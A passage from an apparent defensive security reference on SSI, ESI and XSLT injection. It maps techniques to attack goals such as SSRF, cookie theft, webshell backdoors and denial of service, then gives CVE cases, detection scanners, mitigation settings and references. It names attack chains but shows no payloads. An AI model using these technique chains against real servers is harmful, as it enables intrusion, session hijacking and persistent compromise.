| **Server-Side Request Forgery** | ESI include; XSLT document(); XSLT XXE; SSI include virtual | §2-1, §3-2, §3-5, §1-2 |
| **Session Hijacking (Cookie Theft)** | ESI vars with cookie access; SSI echo HTTP_COOKIE | §2-2, §1-3 |
| **Cross-Site Scripting / Filter Bypass** | ESI comment splitting; ESI variable construction; SSI output injection | §2-3, §2-4 |
| **Cache Poisoning** | ESI inline fragment overwrite; ESI header manipulation | §2-5, §2-4 |
| **Persistent Backdoor** | XSLT file write (webshell); ESI inline JavaScript poisoning | §3-4, §2-5, §4-4 |
| **Denial of Service** | ESI recursive inclusion; XSLT Billion Laughs; Squid parser crashes | §2-7, §3-5 |
| **Server Fingerprinting** | SSI printenv/echo; XSLT system-property | §1-3, §3-1 |

---

## §6. CVE / Real-World Case Mapping

| Mutation Combination | CVE / Case | Impact | Year |
|---------------------|-----------|--------|------|
| §4-5 (SSRF → CRLF → XSLT RCE) | CVE-2025-61882 (Oracle E-Business Suite) | Critical RCE (CVSS 9.8), exploited in the wild by Cl0p ransomware group | 2025 |
| §2-7 (ESI recursive inclusion DoS) | CVE-2025-49763 (Apache Traffic Server) | Remote DoS via memory exhaustion (CVSS 7.5) | 2025 |
| §3-3b + §3-6 (XSLT upload → RCE) | CVE-2023-46214 (Splunk Enterprise) | Authenticated RCE via malicious XSLT upload (CVSS 8.0) | 2023 |
| §3-5 (XSLT XXE) + §3-3 | CVE-2024-28109 (veraPDF) | RCE via XSLT injection in policy check schematron processing | 2024 |
| §3-3b (XSLT Java extension RCE) | HtmlUnit GHSA-37vq-hr2f-g7h7 | RCE via XSLT when browsing attacker's webpage (FEATURE_SECURE_PROCESSING not enabled) | 2024 |
| §2-7 (ESI parser crash) | CVE-2024-45802 (Squid) | DoS via out-of-bounds write in ESI variable handling | 2024 |
| §2-7 (ESI parser crash) | CVE-2018-1000024, CVE-2018-1000027 (Squid) | DoS via pointer handling errors in ESI processing | 2018 |
| §2-4 (ESI header injection) | CVE-2019-2438 (Oracle WebCache) | SSRF via `esi:request_header` Host header override | 2019 |
| §3-3d (.NET script RCE) + §3-5 | CVE-2022-22834, CVE-2022-22835 (OverIT Framework) | XSLT injection + XXE leading to RCE | 2022 |
| §2-2 (ESI cookie theft) | HackerOne #1073780 | Account takeover via ESI-based session cookie extraction | — |
| §3-3b (Xalan Java extension RCE) | EktronCMS Saxon XSLT RCE | RCE via attacker-supplied XSLT processed by Saxon parser | — |
| §3-3 (XSLT extension functions) | 6 CVEs from XDV research (2025 paper) | Multiple XSLT injection RCEs in open-source Java projects | 2025 |

---

## §7. Detection Tools and Scanners

| Tool | Type | Target Scope | Core Technique |
|------|------|-------------|---------------|
| **ZAP (OWASP)** | Scanner | XSLT injection detection (Alert ID 90017) | Active scan with XSLT injection payloads; checks for system-property disclosure |
| **Acunetix** | Scanner | SSI injection, XSLT injection, ESI injection | Automated payload injection with response analysis |
| **Invicti (Netsparker)** | Scanner | XSLT injection | Detection of XSLT processing endpoints with injection testing |
| **Nuclei** | Scanner (template-based) | SSI/ESI/XSLT via community templates | YAML-based detection templates for known patterns |
| **Burp Suite** | Proxy/Scanner | SSI/ESI injection detection | Passive detection via response headers (`Surrogate-Control: content="ESI/1.0"`); active injection testing |
| **XDV** | Static analyzer | XSLT vulnerabilities in Java projects | CodeQL-based taint analysis from user input to XSLT processing sinks (2025 research) |
| **tplmap** | Exploitation tool | SSI injection (+ SSTI) | Automated SSI payload generation and exploitation |
| **Semgrep** | SAST | XSLT injection sinks | Rules for detecting insecure `TransformerFactory` usage and missing `FEATURE_SECURE_PROCESSING` |
| **Splunk ESCU** | Detection rule | CVE-2023-46214 | Detects exploitation attempts of Splunk XSLT RCE |
| **ModSecurity CRS** | WAF | ESI/SSI injection patterns | Rule sets detecting XML-based injection and SSI directive patterns |

---

## §8. Mitigation and Secure Configuration Reference

### SSI Mitigations

| Control | Implementation | Effect |
|---------|---------------|--------|
| Disable `exec` | Apache: `Options +IncludesNOEXEC` | Allows SSI but blocks `exec cmd` and `exec cgi` |
| Disable SSI entirely | Apache: remove `+Includes` from `Options` | Eliminates all SSI processing |
| Restrict file extensions | Only enable SSI for `.shtml` files, not `.html` | Reduces SSI processing scope |
| Input sanitization | Strip or encode `<!--#` sequences from user input | Prevents directive injection |
| Nginx SSI restrictions | `ssi off;` in location blocks | Disables SSI per-location |

### ESI Mitigations

| Control | Implementation | Effect |
|---------|---------------|--------|
| Disable ESI processing | Remove ESI configuration from surrogate | Eliminates ESI attack surface entirely |
| Host whitelisting | Configure `esi:include` src to only allow trusted origins | Prevents SSRF to arbitrary hosts |
| Input escaping | HTML/XML-escape user input before it reaches ESI-processed responses | Prevents ESI tag injection |
| Disable `dca="xslt"` | Remove XSLT support from ESI configuration | Blocks ESI→XSLT escalation chain |
| Inclusion depth limits | Configure maximum nesting depth for `esi:include` | Prevents recursive inclusion DoS (patch for CVE-2025-49763) |
| Upgrade surrogates | Maintain current versions of Squid, Varnish, ATS | Patches known parser crashes and memory corruption |

### XSLT Mitigations

| Control | Implementation | Effect |
|---------|---------------|--------|
| `FEATURE_SECURE_PROCESSING` | Java: `tf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` | Enables security restrictions on the XSLT processor |
| Disable extension functions | Java: `tf.setAttribute("http://javax.xml.XMLConstants/property/accessExternalStylesheet", "")` | Blocks remote stylesheet loading |
| Disable `registerPHPFunctions` | PHP: do not call `$xslt->registerPHPFunctions()` | Prevents PHP function invocation from XSLT |
| Disable `msxsl:script` | .NET: use `XsltSettings.Default` (not `TrustedXslt`) | Blocks C#/VB.NET/JScript script execution |
| Disable external entities | Configure XML parser to reject DTDs and external entities | Blocks XXE through XSLT |
| Reject user XSLT | Never accept user-supplied XSLT stylesheets or allow injection into stylesheet content | Eliminates the injection vector entirely |
| Allowlist extension namespaces | Only permit specific, audited extension namespaces | Limits extension function attack surface |
| `XSLTAccessControl` (lxml) | Python: configure `XSLTAccessControl` to restrict I/O | Controls file/network access from XSLT |

---

## §9. Summary: Core Principles

**The fundamental property that makes SSI/ESI/XSLT injection possible is the same across all three technologies: server-side processing of markup directives within content streams that can be influenced by user input.** In each case, a processing engine — whether a web server's SSI parser, a cache surrogate's ESI engine, or an application's XSLT processor — interprets special markup within the response body, and the boundary between "trusted markup" and "user-controlled content" is either absent or insufficiently enforced.

The reason **incremental patches fail** to eliminate these threats is structural: each technology was designed with the assumption that the content it processes comes from a trusted source. SSI assumes the web developer controls all `.shtml` content. ESI explicitly trusts all upstream responses because the surrogates have no mechanism to distinguish legitimate ESI from injected ESI. XSLT processors expose extension functions because they were designed for trusted transformation pipelines, not adversarial input processing. When these assumptions break — when user input reaches these processing engines — the full power of the technology becomes available to the attacker.

The **structural solution** requires defense-in-depth across three layers: (1) **input boundary enforcement** — ensuring user-controlled data never reaches SSI/ESI/XSLT processing engines without strict sanitization; (2) **capability restriction** — disabling dangerous features (SSI `exec`, XSLT extension functions, ESI `dca="xslt"`) that are not required by the application; and (3) **processing isolation** — running transformation engines with minimal privileges and restricted network/filesystem access, so that even successful injection has limited impact. The most effective approach is to **eliminate the processing entirely** where it is not needed — disable SSI if dynamic includes are not used, remove ESI configuration from surrogates that do not require it, and reject user-supplied XSLT stylesheets at the application boundary.

---

## References

- CWE-97: Improper Neutralization of Server-Side Includes (SSI) Within a Web Page — https://cwe.mitre.org/data/definitions/97.html
- OWASP SSI Injection — https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection
- Apache mod_include documentation — https://httpd.apache.org/docs/current/mod/mod_include.html
- ESI Language Specification 1.0 — W3C Note
- GoSecure ESI Injection Research (Black Hat USA 2018 / DEF CON 26) — Edge Side Include Injection: Abusing Caching Servers into SSRF and Transparent Session Hijacking
- h3xStream ESI Injection Part 2: Abusing Specific Implementations (2019) — http://blog.h3xstream.com/2019/05/esi-injection-part-2-abusing-specific.html
- PayloadsAllTheThings XSLT Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md
- Li, Luo, Liu — "Detecting and Exploiting XSLT Vulnerabilities in Real-World Open Source Projects" (2025) — https://ssrn.com/abstract=5337829
- Oracle JAXP Security Guide — https://docs.oracle.com/en/java/javase/11/security/java-api-xml-processing-jaxp-security-guide.html
- Microsoft CA3076: Insecure XSLT Script Execution — https://learn.microsoft.com/en-us/dotnet/fundamentals/code-analysis/quality-rules/ca3076
- Saxon Documentation: xsl:evaluate — https://www.saxonica.com/html/documentation12/xsl-elements/evaluate.html
- Saxonica: Reflexive Extension Functions — https://www.saxonica.com/html/documentation10/extensibility/functions/index.html
- HackTricks: Server Side Inclusion/Edge Side Inclusion Injection — https://book.hacktricks.wiki/pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html
- SideChannel: Understanding the Edge Side Include Injection Vulnerability — https://www.sidechannel.blog/en/understanding-the-edge-side-include-injection-vulnerability/
- CVE-2025-61882: Oracle E-Business Suite Zero-Day RCE — https://www.centripetal.ai/threat-research/oracle-e-business-suite-zero-day-enables-remote-code-execution
- CVE-2025-49763: Apache Traffic Server ESI Plugin DoS — https://www.imperva.com/blog/cve-2025-49763-remote-dos-via-memory-exhaustion-in-apache-traffic-server-via-esi-plugin/
- CVE-2023-46214: Splunk Enterprise RCE via XSLT — https://advisory.splunk.com/advisories/SVD-2023-1104
- CVE-2024-45802: Squid ESI Processing DoS — https://github.com/squid-cache/squid/security/advisories/GHSA-f975-v7qw-q7hj
- CVE-2024-28109: veraPDF XSLT Injection — https://github.com/veraPDF/veraPDF-library/security/advisories/GHSA-qxqf-2mfx-x8jw
- HtmlUnit XSLT RCE — https://github.com/HtmlUnit/htmlunit/security/advisories/GHSA-37vq-hr2f-g7h7
- INE: XSLT Injection Attacks — https://ine.com/blog/xslt-injections-for-dummies

---

*This document was created for defensive security research and vulnerability understanding purposes.*
